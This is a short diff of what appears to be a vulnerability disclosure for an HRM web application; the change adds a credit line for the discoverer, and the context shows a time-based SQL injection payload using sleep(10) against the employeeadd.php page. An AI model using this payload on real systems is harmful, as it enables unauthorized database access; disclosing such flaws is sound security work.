@@ -27,3 +27,5 @@ Payload SQLi with sleep(10): /hrm/employeeadd.php?empid=1%27%20or%20sleep(10)%20
 Check payload at MySQL log:
 
 ![](images/mysql-log.png)
+
+#### Discoverer(s)/Credits: NGO VAN TU (@leecybersec)
